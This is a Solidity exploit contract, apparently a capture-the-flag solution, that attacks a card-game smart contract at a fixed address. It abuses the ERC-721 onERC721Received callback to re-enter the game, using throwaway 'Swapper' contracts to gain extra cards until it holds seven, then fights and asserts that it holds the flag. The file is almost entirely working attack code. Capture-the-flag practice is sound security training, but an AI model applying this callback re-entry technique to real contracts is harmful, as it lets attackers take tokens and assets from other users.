//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "hardhat/console.sol";

interface IERC721 {
  function balanceOf(address owner) external view returns (uint256);
}

interface IERC721Receiver {
  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
  ) external returns (bytes4);
}

interface IGame {
  function join() external returns (uint256[3] memory deck);

  function swap(
    address _to,
    uint256 _monId1,
    uint256 _monId2
  ) external;

  function putUpForSale(uint256 _monId) external;

  function fight() external;

  function flagHolder() external returns (address);
}

contract Swapper {
  constructor() {
    IGame game = IGame(0x9E4c331120448816450615349BD25605e4A2049E);
    uint256[3] memory decks = game.join();
    game.putUpForSale(decks[0]);
    game.swap(msg.sender, decks[0], decks[0]);
  }
}

contract Cheater is IERC721Receiver {
  IGame game = IGame(0x9E4c331120448816450615349BD25605e4A2049E);

  constructor() {
    game.join();
  }

  function cheat() external {
    new Swapper();
  }

  function onERC721Received(
    address, /* operator */
    address, /* from */
    uint256, /* tokenId */
    bytes calldata /* data */
  ) external returns (bytes4) {
    if (IERC721(msg.sender).balanceOf(address(this)) < 7) {
      new Swapper();
    } else {
      game.fight();
      assert(game.flagHolder() == address(this));
    }
    return IERC721Receiver.onERC721Received.selector;
  }
}
